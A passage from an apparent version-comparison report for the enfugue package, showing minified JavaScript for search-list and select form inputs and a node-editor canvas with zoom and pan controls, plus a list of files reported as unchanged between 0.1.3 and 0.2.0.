classList=["enfugue-search-list-items"];async build(){let t=await super.build();return t.on("mousewheel",(t=>{t.stopPropagation()})),t}}class SearchListMultiInputListView extends ListMultiInputView{static maximumOptions=100;static classList=["enfugue-search-list-items","enfugue-multi-search-list-items"];async build(){let t=await super.build();return t.on("mousewheel,mouseup",(t=>{t.stopPropagation()})),t}}class SearchListInputView extends EnumerableInputView{static tagName="enfugue-search-list";static placeholder="Start typing to search…";static searchTimeout=250;static filterThreshold=.9;static listInputClass=SearchListInputListView;static stringInputClass=StringInputView;static setClosestOnBlur=!0;static resetListOnFocus=!0;static hideListOnBlur=!0;static hideListOnChange=!0;static populateSearchOnSet=!0;static debounceChangeThreshold=150;constructor(t,e,s){super(t,e,s),this.stringInput=new this.constructor.stringInputClass(t,"autofill",{placeholder:this.constructor.placeholder}),this.stringInput.onInput((t=>this.searchChanged(t))),this.stringInput.onFocus((async()=>{await this.stringInput.getNode();let t=await this.listInput.getNode(),e=this.node.element.getBoundingClientRect(),s=e.x,i=e.y+e.height,a=e.width,n=(e,n,l)=>{s=e,i=n,a=l,t.css({width:`${l}px`,left:`${e}px`,top:`${n}px`})};this.repositionInterval=setInterval((()=>{e=this.node.element.getBoundingClientRect();let t=e.x,l=e.y+e.height,o=e.width;s===t&&i===l&&a===o||n(t,l,o)}),25),document.body.appendChild(t.render()),n(s,i,a),t.css({width:`${e.width}px`,left:`${e.x}px`,top:`${e.y+e.height}px`}),this.listInput.show(),this.constructor.resetListOnFocus&&this.listInput.setValue(null,!1);let l=t=>{this.listInput.hide(),window.removeEventListener("click",l,!1),clearTimeout(this.searchDebounceTimer),clearInterval(this.repositionInterval)};window.addEventListener("click",l,!1)})),this.stringInput.onBlur((async t=>{if(this.constructor.hideListOnBlur){let t=e=>{setTimeout((async()=>{this.listInput.hide(),document.body.removeChild((await this.listInput.getNode()).element)}),100),window.removeEventListener("mouseup",t,!0)};window.addEventListener("mouseup",t,!0),clearTimeout(this.searchDebounceTimer),clearInterval(this.repositionInterval)}if(this.constructor.setClosestOnBlur){let t=strip(this.stringInput.getValue()).toLowerCase();if(isEmpty(t))this.value=null;else{let e=await this.getOptions(),s=Object.getOwnPropertyNames(e);s.sort(((s,i)=>jaroWinkler(e[i].toLowerCase(),t)-jaroWinkler(e[s].toLowerCase(),t))),this.value=s[0],this.stringInput.setValue(e[this.value],!1)}}})),this.listInput=new this.constructor.listInputClass(t,"list",{options:()=>this.getOptions()}),this.listInput.onChange((async()=>{let t=await this.getOptions(),e=this.listInput.getValue();this.value=e,this.constructor.populateSearchOnSet&&this.stringInput.setValue(t[e]),this.constructor.hideListOnChange&&(clearTimeout(this.searchDebounceTimer),clearInterval(this.repositionInterval)),this.changed()})),this.listInput.hide()}disable(){if(clearTimeout(this.searchDebounceTimer),this.stringInput.disable(),this.listInput.disable(),void 0!==this.node)for(let t of this.node.findAll(E.getCustomTag("searchSelection")))t.find("button").disabled(!0)}enable(){if(this.stringInput.enable(),this.listInput.enable(),void 0!==this.node)for(let t of this.node.findAll(E.getCustomTag("searchSelection")))t.find("button").disabled(!1)}setOptions(t){super.setOptions(t),this.listInput.setValue([],!1),this.listInput.setOptions(t)}rebuildOptions(){}buildOptions(){}getValue(){return this.value}setValue(t,e){super.setValue(t,!1);void 0!==this.stringInput&&this.stringInput.setValue(t,!1),e&&this.changed()}searchChanged(t){clearTimeout(this.searchDebounceTimer),this.searchDebounceTimer=setTimeout((()=>{this.search(t)}),this.constructor.searchTimeout)}async search(t){t=strip(t.toLowerCase()),isEmpty(t)?await this.listInput.sortFilterOptions(((t,e)=>t-e),((t,e)=>!1)):await this.listInput.sortFilterOptions(((e,s,i,a)=>jaroWinkler(a.toLowerCase(),t)-jaroWinkler(i.toLowerCase(),t)),((e,s)=>1-jaroWinkler(s.toLowerCase(),t)>=this.constructor.filterThreshold))}async build(){let t=await super.build();return t.append(await this.stringInput.getNode()),t.on("dragover",(e=>{e.preventDefault(),e.stopPropagation();let s=e.target,i=t.findAll(E.getCustomTag("searchSelection")),a=e.offsetX;for(let t of i)t.removeClass("drop-left").removeClass("drop-right");for(;-1===["ENFUGUE-SEARCH-LIST-SELECTION","ENFUGUE-SEARCH-LIST"].indexOf(s.tagName);)a+=s.offsetLeft,s=s.parentElement;if("ENFUGUE-SEARCH-LIST-SELECTION"==s.tagName&&!s.classList.contains("dragged")){let t=s.dataset.selectValue,e=i.filter((e=>e.data("select-value")===t)).shift();a>s.offsetWidth/2?e.addClass("drop-right"):e.addClass("drop-left")}})).on("drop",(e=>{let s=e.target,i=e.dataTransfer.getData("text/plain"),a=e.offsetX,n=t.findAll(E.getCustomTag("searchSelection"));for(let t of n)t.removeClass("drop-left").removeClass("drop-right");for(;-1===["ENFUGUE-SEARCH-LIST-SELECTION","ENFUGUE-SEARCH-LIST"].indexOf(s.tagName);)a+=s.offsetLeft,s=s.parentElement;if("ENFUGUE-SEARCH-LIST-SELECTION"==s.tagName){let e=s.dataset.selectValue;if(i!==e){let l=n.filter((t=>t.data("select-value")===i)).shift(),o=n.filter((t=>t.data("select-value")===e)).shift(),r=this.value.indexOf(i),u=this.value.indexOf(e),h=(l.find("span").getText(),o.find("span").getText(),a>s.offsetWidth/2);t.remove(l),this.value=this.value.filter((t=>t!=i)),!h&&r<u?u--:h&&r>u&&u++,this.value=this.value.slice(0,u).concat([i]).concat(this.value.slice(u)),this.listInput.setValue(this.value,!1),t.insert(u,l),this.changed()}}})),t}async changed(){let t=(new Date).getTime();void 0!==this.lastChange&&t-this.lastChange<this.constructor.debounceChangeThreshold||(await super.changed(),this.lastChange=t)}}class SearchListMultiInputView extends SearchListInputView{static setClosestOnBlur=!1;static resetListOnFocus=!1;static hideListOnBlur=!1;static populateSearchOnSet=!1;static hideListOnChange=!1;static listInputClass=SearchListMultiInputListView;constructor(t,e,s){super(t,e,s),this.onChange((async()=>{let t=this.getValue(),e=await this.getOptions();isEmpty(t)&&(t=[]),void 0!==this.node&&this.node.content(...t.map((t=>{let s=E.searchSelection().data("select-value",t),i=E.button().content("&times;"),a=E.span().content(e[t]);return i.on("click",(t=>{t.preventDefault(),t.stopPropagation(),this.value=this.value.filter((t=>t!==s.data("select-value"))),this.listInput.setValue(this.value,!1),this.changed()})),s.attr("draggable","true").on("dragstart",(e=>{s.addClass("dragged");let i=e.dataTransfer;i.dropEffect="move",i.effectAllowed="move",i.setData("text/plain",t)})).on("dragend",(t=>{s.removeClass("dragged")})),s.content(i,a)})),await this.stringInput.getNode())}))}async build(){let t=await super.build();return t.append(await this.stringInput.getNode()),t}}export{EnumerableInputView,SelectInputView,ListInputView,ListMultiInputView,SearchListInputView,SearchListInputListView,SearchListMultiInputView};
+import{isEmpty,jaroWinkler,strip}from"../../../base/helpers.mjs";import{ElementBuilder}from"../../../base/builder.mjs";import{InputView}from"./base.mjs";import{StringInputView}from"./string.mjs";const E=new ElementBuilder({searchList:"enfugue-search-list",searchListItem:"enfugue-search-list-item",searchSelection:"enfugue-search-list-selection",repeatableInput:"enfugue-repeatable-input",repeatableItem:"enfugue-repeatable-input-item"});class EnumerableInputView extends InputView{static defaultOptions={};constructor(t,e,s){super(t,e,s),this.options=this.fieldConfig.options||{},this.sortFunction=this.fieldConfig.sortFunction||((t,e)=>t-e),this.filterFunction=this.fieldConfig.filterFunction||((t,e)=>!1)}setOptions(t){Array.isArray(t)?this.options=t.reduce(((t,e)=>(t[e]=e,t)),{}):this.options=t,void 0!==this.node&&this.rebuildOptions()}async sortOptions(t){this.sortFunction=t,void 0!==this.node&&await this.rebuildOptions()}async filterOptions(t){this.filterFunction=t,void 0!==this.node&&await this.rebuildOptions()}async sortFilterOptions(t,e){this.sortFunction=t,this.filterFunction=e,void 0!==this.node&&await this.rebuildOptions()}async getOptions(){let t=this.options,e=this.constructor.defaultOptions;"function"==typeof t&&(t=await this.options()),Array.isArray(t)&&(t=t.reduce(((t,e)=>(t[e]=e,t)),{})),"function"==typeof e&&(e=await e()),Array.isArray(e)&&(e=e.reduce(((t,e)=>(t[e]=e,t)),{}));let s={...e,...t},i=Object.getOwnPropertyNames(s),a={};i.sort(((t,e)=>this.sortFunction(t,e,s[t],s[e])));for(let t of i)this.filterFunction(t,s[t])||(a[t]=s[t]);return a}buildOptions(t,e){}async rebuildOptions(){void 0!==this.node&&this.buildOptions(this.node,await this.getOptions())}async build(){let t=await super.build();return this.buildOptions(t,await this.getOptions()),t}}class SelectInputView extends EnumerableInputView{static tagName="select";static alwaysShowEmpty=!1;static allowEmpty=!1;async buildOptions(t,e){let s=this.placeholder;isEmpty(s)&&(s="Select One");let i=[];(isEmpty(this.value)||this.constructor.alwaysShowEmpty||this.constructor.allowEmpty)&&i.push(E.option().selected(!0).disabled(!this.constructor.allowEmpty).value("").content(s));for(let t in e){let s=E.option().value(t).content(e[t]);this.value==t&&s.selected(!0),i.push(s)}return t.content(...i)}setValue(t,e){if(void 0!==this.node){this.node.value(t);for(let t of this.node.findAll("option"))t.value()==this.value?t.selected(!0):t.selected(!1)}super.setValue(t,e)}async build(){let t=await super.build();return isEmpty(this.value)||t.value(this.value),t}}class ListInputView extends EnumerableInputView{static tagName="ul";static className="list-input-view";static maximumOptions=1/0;getValue(){return this.value}setValue(t,e){if(super.setValue(t,e),void 0!==this.node)for(let t of this.node.findAll("li"))t.data("value")===this.value?t.addClass("selected"):t.removeClass("selected")}buildOptions(t,e){let s=0,i=[];for(let a in e){let n=E.span().content(e[a]),l=E.li().content(n).data("value",a);if(l.on("click",(e=>{e.stopPropagation(),e.preventDefault();for(let e of t.children())e.removeClass("selected");l.addClass("selected"),this.value=a,this.changed()})),this.value===a&&l.addClass("selected"),i.push(l),s++,s>=this.constructor.maximumOptions)break}return t.content(...i)}}class ListMultiInputView extends ListInputView{static maximumSelected=1/0;static className="list-input-view multi-list-input-view";constructor(t,e,s){super(t,e,s),isEmpty(this.value)&&(this.value=[])}setValue(t,e){if(super.setValue(t,e),isEmpty(this.value)?this.value=[]:Array.isArray(this.value)||(this.value=[this.value]),void 0!==this.node)for(let t of this.node.findAll("li"))-1!==this.value.indexOf(t.data("value"))?t.addClass("selected"):t.removeClass("selected")}buildOptions(t,e){let s=0,i=[];for(let t in e){let a=E.li().content(E.span().content(e[t])).data("value",t);if(a.on("click",(e=>{e.stopPropagation(),e.preventDefault(),a.hasClass("selected")?(this.value=this.value.filter((e=>e!==t)),a.removeClass("selected")):(isEmpty(this.value)&&(this.value=[]),this.value.push(t),a.addClass("selected")),this.changed()})),isEmpty(this.value)&&-1!==this.value.indexOf(t)&&a.addClass("selected"),i.push(a),s++,s>=this.constructor.maximumOptions)break}return t.content(...i)}}class SearchListInputListView extends ListInputView{static maximumOptions=100;static classList=["enfugue-search-list-items"];async build(){let t=await super.build();return t.on("mousewheel",(t=>{t.stopPropagation()})),t}}class SearchListMultiInputListView extends ListMultiInputView{static maximumOptions=100;static classList=["enfugue-search-list-items","enfugue-multi-search-list-items"];async build(){let t=await super.build();return t.on("mousewheel,mouseup",(t=>{t.stopPropagation()})),t}}class SearchListInputView extends EnumerableInputView{static tagName="enfugue-search-list";static placeholder="Start typing to search…";static searchTimeout=250;static filterThreshold=.9;static listInputClass=SearchListInputListView;static stringInputClass=StringInputView;static setClosestOnBlur=!0;static resetListOnFocus=!0;static hideListOnBlur=!0;static hideListOnChange=!0;static populateSearchOnSet=!0;static debounceChangeThreshold=150;constructor(t,e,s){super(t,e,s),this.stringInput=new this.constructor.stringInputClass(t,"autofill",{placeholder:this.constructor.placeholder}),this.stringInput.onInput((t=>this.searchChanged(t))),this.stringInput.onFocus((async()=>{await this.stringInput.getNode();let t=await this.listInput.getNode(),e=this.node.element.getBoundingClientRect(),s=e.x,i=e.y+e.height,a=e.width,n=(e,n,l)=>{s=e,i=n,a=l,t.css({width:`${l}px`,left:`${e}px`,top:`${n}px`})};this.repositionInterval=setInterval((()=>{e=this.node.element.getBoundingClientRect();let t=e.x,l=e.y+e.height,o=e.width;s===t&&i===l&&a===o||n(t,l,o)}),25),document.body.appendChild(t.render()),n(s,i,a),t.css({width:`${e.width}px`,left:`${e.x}px`,top:`${e.y+e.height}px`}),this.listInput.show(),this.constructor.resetListOnFocus&&this.listInput.setValue(null,!1);let l=t=>{this.listInput.hide(),window.removeEventListener("click",l,!1),clearTimeout(this.searchDebounceTimer),clearInterval(this.repositionInterval)};window.addEventListener("click",l,!1)})),this.stringInput.onBlur((async t=>{if(this.constructor.hideListOnBlur){let t=e=>{setTimeout((async()=>{this.listInput.hide(),document.body.removeChild((await this.listInput.getNode()).element)}),100),window.removeEventListener("mouseup",t,!0)};window.addEventListener("mouseup",t,!0),clearTimeout(this.searchDebounceTimer),clearInterval(this.repositionInterval)}if(!0!==this.listInputInput&&this.constructor.setClosestOnBlur){let t=strip(this.stringInput.getValue()).toLowerCase(),e=!1;if(isEmpty(t))e=!isEmpty(this.value),this.value=null;else{let s=await this.getOptions(),i=Object.getOwnPropertyNames(s);i.sort(((e,i)=>jaroWinkler(s[i].toLowerCase(),t)-jaroWinkler(s[e].toLowerCase(),t))),e=this.value!==i[0],this.value=i[0],this.stringInput.setValue(s[this.value],!1)}e&&this.changed()}})),this.listInput=new this.constructor.listInputClass(t,"list",{options:()=>this.getOptions()}),this.listInput.onMouseDown((async()=>{this.listInputInput=!0})),this.listInput.onMouseUp((async()=>{this.listInputInput=!1})),this.listInput.onChange((async()=>{let t=await this.getOptions(),e=this.listInput.getValue();this.value=e,this.constructor.populateSearchOnSet&&this.stringInput.setValue(t[e],!1),this.constructor.hideListOnChange&&(clearTimeout(this.searchDebounceTimer),clearInterval(this.repositionInterval)),this.changed()})),this.listInput.hide()}disable(){if(clearTimeout(this.searchDebounceTimer),this.stringInput.disable(),this.listInput.disable(),void 0!==this.node)for(let t of this.node.findAll(E.getCustomTag("searchSelection")))t.find("button").disabled(!0)}enable(){if(this.stringInput.enable(),this.listInput.enable(),void 0!==this.node)for(let t of this.node.findAll(E.getCustomTag("searchSelection")))t.find("button").disabled(!1)}setOptions(t){super.setOptions(t),this.listInput.setValue([],!1),this.listInput.setOptions(t)}rebuildOptions(){}buildOptions(){}getValue(){return this.value}setValue(t,e){super.setValue(t,!1);void 0!==this.stringInput&&this.stringInput.setValue(t,!1),e&&this.changed()}searchChanged(t){clearTimeout(this.searchDebounceTimer),this.searchDebounceTimer=setTimeout((()=>{this.search(t)}),this.constructor.searchTimeout)}async search(t){t=strip(t.toLowerCase()),isEmpty(t)?await this.listInput.sortFilterOptions(((t,e)=>t-e),((t,e)=>!1)):await this.listInput.sortFilterOptions(((e,s,i,a)=>jaroWinkler(a.toLowerCase(),t)-jaroWinkler(i.toLowerCase(),t)),((e,s)=>1-jaroWinkler(s.toLowerCase(),t)>=this.constructor.filterThreshold))}async build(){let t=await super.build();return t.append(await this.stringInput.getNode()),t.on("dragover",(e=>{e.preventDefault(),e.stopPropagation();let s=e.target,i=t.findAll(E.getCustomTag("searchSelection")),a=e.offsetX;for(let t of i)t.removeClass("drop-left").removeClass("drop-right");for(;-1===["ENFUGUE-SEARCH-LIST-SELECTION","ENFUGUE-SEARCH-LIST"].indexOf(s.tagName);)a+=s.offsetLeft,s=s.parentElement;if("ENFUGUE-SEARCH-LIST-SELECTION"==s.tagName&&!s.classList.contains("dragged")){let t=s.dataset.selectValue,e=i.filter((e=>e.data("select-value")===t)).shift();a>s.offsetWidth/2?e.addClass("drop-right"):e.addClass("drop-left")}})).on("drop",(e=>{let s=e.target,i=e.dataTransfer.getData("text/plain"),a=e.offsetX,n=t.findAll(E.getCustomTag("searchSelection"));for(let t of n)t.removeClass("drop-left").removeClass("drop-right");for(;-1===["ENFUGUE-SEARCH-LIST-SELECTION","ENFUGUE-SEARCH-LIST"].indexOf(s.tagName);)a+=s.offsetLeft,s=s.parentElement;if("ENFUGUE-SEARCH-LIST-SELECTION"==s.tagName){let e=s.dataset.selectValue;if(i!==e){let l=n.filter((t=>t.data("select-value")===i)).shift(),o=n.filter((t=>t.data("select-value")===e)).shift(),r=this.value.indexOf(i),u=this.value.indexOf(e),h=(l.find("span").getText(),o.find("span").getText(),a>s.offsetWidth/2);t.remove(l),this.value=this.value.filter((t=>t!=i)),!h&&r<u?u--:h&&r>u&&u++,this.value=this.value.slice(0,u).concat([i]).concat(this.value.slice(u)),this.listInput.setValue(this.value,!1),t.insert(u,l),this.changed()}}})),t}async changed(t){let e=(new Date).getTime();void 0!==this.lastChange&&e-this.lastChange<this.constructor.debounceChangeThreshold||(await super.changed(t),this.lastChange=e)}}class SearchListMultiInputView extends SearchListInputView{static setClosestOnBlur=!1;static resetListOnFocus=!1;static hideListOnBlur=!1;static populateSearchOnSet=!1;static hideListOnChange=!1;static listInputClass=SearchListMultiInputListView;constructor(t,e,s){super(t,e,s),this.onChange((async()=>{let t=this.getValue(),e=await this.getOptions();isEmpty(t)&&(t=[]),void 0!==this.node&&this.node.content(...t.map((t=>{let s=E.searchSelection().data("select-value",t),i=E.button().content("&times;"),a=E.span().content(e[t]);return i.on("click",(t=>{t.preventDefault(),t.stopPropagation(),this.value=this.value.filter((t=>t!==s.data("select-value"))),this.listInput.setValue(this.value,!1),this.changed()})),s.attr("draggable","true").on("dragstart",(e=>{s.addClass("dragged");let i=e.dataTransfer;i.dropEffect="move",i.effectAllowed="move",i.setData("text/plain",t)})).on("dragend",(t=>{s.removeClass("dragged")})),s.content(i,a)})),await this.stringInput.getNode())}))}async build(){let t=await super.build();return t.append(await this.stringInput.getNode()),t}}export{EnumerableInputView,SelectInputView,ListInputView,ListMultiInputView,SearchListInputView,SearchListInputListView,SearchListMultiInputView};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/view/forms/input/file.mjs` & `enfugue-0.2.0/enfugue/static/js/view/forms/input/file.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/forms/input/numeric.mjs` & `enfugue-0.2.0/enfugue/static/js/view/forms/input/numeric.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/forms/input/parent.mjs` & `enfugue-0.2.0/enfugue/static/js/view/forms/input/parent.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/forms/input/string.mjs` & `enfugue-0.2.0/enfugue/static/js/view/forms/input/string.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/forms/input.mjs` & `enfugue-0.2.0/enfugue/static/js/view/forms/input.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/image.mjs` & `enfugue-0.2.0/enfugue/static/js/view/image.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/menu.mjs` & `enfugue-0.2.0/enfugue/static/js/view/menu.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/nodes/base.mjs` & `enfugue-0.2.0/enfugue/static/js/view/nodes/base.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/nodes/decorations.mjs` & `enfugue-0.2.0/enfugue/static/js/view/nodes/decorations.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/view/nodes/editor.mjs` & `enfugue-0.2.0/enfugue/static/js/view/nodes/editor.mjs`

 * *Files 1% similar despite different names*

```diff
@@ -1 +1 @@
-import{View}from"../base.mjs";import{FormView}from"../forms/base.mjs";import{InputView}from"../forms/input.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{isEmpty,deepClone,sleep}from"../../base/helpers.mjs";import{NodeEditorDecorationsView,NodeConnectionSpline}from"./decorations.mjs";import{NodeView,OptionsNodeView}from"./base.mjs";const E=new ElementBuilder({node:"enfugue-node",nodeCanvas:"enfugue-node-canvas",editorPosition:"enfugue-node-editor-position",positionReadout:"enfugue-node-editor-position-readout",positionReset:"enfugue-node-editor-position-reset",editorZoom:"enfugue-node-editor-zoom",zoomIn:"enfugue-node-editor-zoom-in",zoomOut:"enfugue-node-editor-zoom-out",zoomReadout:"enfugue-node-editor-zoom-readout",zoomReset:"enfugue-node-editor-zoom-reset"});class NodeEditorView extends View{static tagName="enfugue-node-editor";static canvasWidth="auto";static canvasHeight="auto";static maximumZoom=2;static minimumZoom=.125;static zoomPerScroll=.125;static canMove=!0;static canZoom=!0;static centered=!1;static defaultCursor="default";static disableCursor=!1;static nodeClasses=[NodeView];static classList=["loader-cover"];static zoomInIcon="fa-solid fa-magnifying-glass-plus";static zoomOutIcon="fa-solid fa-magnifying-glass-minus";constructor(t,e,o){super(t),this.zoom=1,this.constructor.centered?("auto"!=this.constructor.canvasWidth&&(this.left=-this.constructor.canvasWidth/2,isEmpty(e)||(this.left+=e/2)),"auto"!=this.constructor.canvasHeight&&(this.top=-this.constructor.canvasHeight/2,isEmpty(o)||(this.top+=o/2))):(this.left=0,this.top=0),this.nodes=[],this.nodeClasses=[].concat(this.constructor.nodeClasses),this.decorations=new NodeEditorDecorationsView(t,this,this.constructor.canvasWidth,this.constructor.canvasHeight),this.resizeCallbacks=[],window.addEventListener("resize",(t=>this.windowResized(t)))}onWindowResize(t){this.resizeCallbacks.push(t)}async windowResized(){if(void 0!==this.node&&!isEmpty(this.node.element)){let[t,e]=[this.node.element.parentElement.clientWidth,this.node.element.parentElement.clientHeight];t<this.width?this.node.addClass("oversize-x"):this.node.removeClass("oversize-x"),e<this.height?this.node.addClass("oversize-y"):this.node.removeClass("oversize-y")}for(let t of this.resizeCallbacks)t()}addNodeClass(t){-1===this.nodeClasses.map((t=>t.name)).indexOf(t.name)&&this.nodeClasses.push(t)}get height(){return"auto"==this.constructor.canvasHeight?void 0!==this.node?this.node.element.clientHeight:0:void 0===this.canvasHeight?this.constructor.canvasHeight:this.canvasHeight}get width(){return"auto"==this.constructor.canvasWidth?void 0!==this.node?this.node.element.clientWidth:0:void 0===this.canvasWidth?this.constructor.canvasWidth:this.canvasWidth}set height(t){if(this.canvasHeight=t,void 0!==this.node){this.node.find(E.getCustomTag("nodeCanvas")).height(t).css("height",`${t}px`),this.decorations.setDimension(this.width,t);for(let t of this.nodes)t.resetDimension()}}set width(t){if(this.canvasWidth=t,void 0!==this.node){this.node.find(E.getCustomTag("nodeCanvas")).width(t).css("width",`${t}px`),this.decorations.setDimension(t,this.height);for(let t of this.nodes)t.resetDimension()}}getState(){return this.nodes.map((t=>t.getState()))}async setState(t){for(let t of this.nodes)this.removeNode(t);let e=this.node.find(E.getCustomTag("nodeCanvas"));for(let o of t){let t=this.nodeClasses.filter((t=>t.name===o.classname)).shift();if(void 0===t)throw"Class name out of scope: "+o.classname;let s=new t(this);this.nodes.push(s),await s.setState(o),e.append(await s.getNode())}this.nodes=this.nodes.map(((t,e)=>(t.index=e,t))),await this.redraw()}redraw(){return isEmpty(this.redrawPromise)&&(this.redrawPromise=new Promise((async(t,e)=>{for(let t of this.nodes)await t.resetDimension();window.requestAnimationFrame((()=>{this.decorations.draw(),this.redrawPromise=null,t()}))}))),this.redrawPromise}async addNode(t){let e=new t(this,...Array.from(arguments).slice(1));if(this.nodes.push(e),this.nodes=this.nodes.map(((t,e)=>(t.index=e,t))),void 0!==this.node){let t=await e.getNode();this.node.find(E.getCustomTag("nodeCanvas")).append(t)}return e}removeNode(t){for(let e of this.nodes)if(e==t)return this.nodes=this.nodes.filter((e=>e!=t)).map(((t,e)=>(t.index=e,t))),void(isEmpty(this.node)||this.node.find(E.getCustomTag("nodeCanvas")).remove(e.node));throw"Could not find node to remove."}focusNode(t){let e=this.nodes.indexOf(t);e!==this.nodes.length-1&&-1!==e&&(this.nodes=this.nodes.slice(0,e).concat(this.nodes.slice(e+1)),this.nodes.push(t),this.node.find(E.getCustomTag("nodeCanvas")).remove(t.node).append(t.node))}async copyNode(t){let e=t.getState(),o=await this.addNode(t.constructor);return e.x+=t.constructor.padding,e.y+=t.constructor.padding,await o.setState(e),this.focusNode(o),o}async build(){let t=await super.build(),e=E.nodeCanvas().css("cursor",this.constructor.defaultCursor),o=E.positionReadout().content("0,0"),s=E.positionReset().content("Reset"),i=E.editorPosition().content(o,s),n=E.zoomReadout().content(`${this.zoom.toFixed(3)}`),a=E.zoomReset().content("Reset"),r=E.zoomIn().content(E.i().class(this.constructor.zoomInIcon)),h=E.zoomOut().content(E.i().class(this.constructor.zoomOutIcon)),c=E.editorZoom().content(r,h,a,n);"auto"==this.constructor.canvasWidth?e.css("width","100%"):e.width(this.width).css("width",`${this.width}px`),"auto"==this.constructor.canvasHeight?e.css("height","100%"):e.height(this.height).css("height",`${this.height}px`),e.css("left",`${this.left}px`),e.css("top",`${this.top}px`),this.decorations.setDimension(this.width,this.height),e.append(await this.decorations.getNode());for(let t of this.nodes)e.append(await t.getNode());if(window.innerWidth<this.width&&t.addClass("oversize-x"),window.innerHeight<this.height&&t.addClass("oversize-y"),t.append(e),this.constructor.disableCursor)t.css("pointer-events","none");else if(this.constructor.canMove&&(t.append(i),e.on("mousedown",(s=>{if(!(2===s.which||1===s.which&&s.ctrlKey))return;s.preventDefault(),s.stopPropagation();let[i,n]=[s.clientX,s.clientY];e.css("cursor","grabbing"),e.on("mousemove",(s=>{s.preventDefault(),s.stopPropagation();let a,r,[h,c]=[s.clientX-i,s.clientY-n],[d,m]=[this.left+h,this.top+c];if(e.css({left:`${d}px`,top:`${m}px`}),this.constructor.centered){let e=this.constructor.canvasWidth/2-t.element.clientWidth/2,o=this.constructor.canvasHeight/2-t.element.clientHeight/2;a=-e-d/this.zoom,r=-o-m/this.zoom}else a=-d/this.zoom,r=-m/this.zoom;1!=this.zoom&&(a=a.toFixed(2),r=r.toFixed(2)),o.content(`${a},${r}`)})).on("mouseup,mouseleave",(s=>{s.preventDefault(),s.stopPropagation();let a,r,[h,c]=[s.clientX-i,s.clientY-n];if(this.left+=h,this.top+=c,e.off("mouseup,mousemove,mouseleave"),e.css({left:`${this.left}px`,top:`${this.top}px`,cursor:this.constructor.defaultCursor}),this.constructor.centered){let e=this.constructor.canvasWidth/2-t.element.clientWidth/2,o=this.constructor.canvasHeight/2-t.element.clientHeight/2;a=-e-this.left/this.zoom,r=-o-this.top/this.zoom}else a=-this.left/this.zoom,r=-this.top/this.zoom;1!=this.zoom&&(a=a.toFixed(2),r=r.toFixed(2)),o.content(`${a},${r}`)}))})),s.on("click",(s=>{s.preventDefault(),s.stopPropagation(),this.constructor.centered?(this.left=-this.constructor.canvasWidth/2*this.zoom+t.element.clientWidth/2,this.top=-this.constructor.canvasHeight/2*this.zoom+t.element.clientHeight/2):(this.left=0,this.top=0),o.content("0,0"),e.css({left:`${this.left}px`,top:`${this.top}px`})}))),this.constructor.canZoom){t.append(c);let i=(s,i,a)=>{let r=s-this.zoom,h=-i*r,c=-a*r;if(this.left+=h,this.top+=c,this.zoom=s,n.content(this.zoom.toFixed(3)),e.css({left:`${this.left}px`,top:`${this.top}px`,transform:`scale(${this.zoom})`}),this.constructor.canMove){let e,s;if(this.constructor.centered){let o=this.constructor.canvasWidth/2-t.element.clientWidth/2,i=this.constructor.canvasHeight/2-t.element.clientHeight/2;e=-o-this.left/this.zoom,s=-i-this.top/this.zoom}else e=-this.left/this.zoom,s=-this.top/this.zoom;1!=this.zoom&&(e=e.toFixed(2),s=s.toFixed(2)),o.content(`${e},${s}`)}this.zoom>1?t.addClass("zoom-in"):t.removeClass("zoom-in"),this.zoom<1?t.addClass("zoom-out"):t.removeClass("zoom-out")};e.on("wheel",(t=>{if("ENFUGUE-NODE-CANVAS"!==t.target.tagName){let e=t.deltaY>0,o=t.target;for(;null!=o&&"ENFUGUE-NODE-EDITOR"!==o.tagName&&"ENFUGUE-NODE-CANVAS"!==o.tagName;){if(o.scrollHeight!==o.offsetHeight&&"ENFUGUE-NODE-CONTENTS"!==o.tagName){let t=o.offsetHeight+o.scrollTop,s=getComputedStyle(o).overflowY;if(-1!==["auto","scroll"].indexOf(s)){if(o.scrollHeight-t>1&&e)return;if(o.scrollTop>0&&!e)return}}o=o.parentElement}}t.preventDefault(),t.stopPropagation();let e,o=1;this.zoom>=5?o=4:this.zoom>=2.5&&(o=2),e=t.deltaY<0?this.zoom+this.constructor.zoomPerScroll*o:this.zoom-this.constructor.zoomPerScroll*o;let s=t.target,n=t.offsetX,a=t.offsetY;for(;"ENFUGUE-NODE-CANVAS"!=s.tagName&&"ENFUGUE-NODE-EDITOR-CANVAS"!=s.tagName;)n+=s.offsetLeft,a+=s.offsetTop,s=s.parentElement;e>=this.constructor.minimumZoom&&e<=this.constructor.maximumZoom&&e!=this.zoom&&i(e,n,a)})),r.on("click",(t=>{t.preventDefault(),t.stopPropagation();let e=this.zoom+this.constructor.zoomPerScroll;e>=this.constructor.minimumZoom&&e<=this.constructor.maximumZoom&&e!=this.zoom&&i(e,this.width/2,this.height/2)})).on("dblclick",(t=>{t.preventDefault()})),h.on("click",(t=>{t.preventDefault(),t.stopPropagation();let e=this.zoom-this.constructor.zoomPerScroll;e>=this.constructor.minimumZoom&&e<=this.constructor.maximumZoom&&e!=this.zoom&&i(e,this.width/2,this.height/2)})).on("dblclick",(t=>{t.preventDefault()})),a.on("click",(t=>{t.preventDefault(),t.stopPropagation(),this.zoom=1,n.content("1.000"),e.css({transform:"scale(1)"}),s.trigger("click")}))}return t}}class NodesView extends NodeEditorView{static tagName="enfugue-nodes";static canMove=!1;static canZoom=!1}export{NodeEditorView,NodesView};
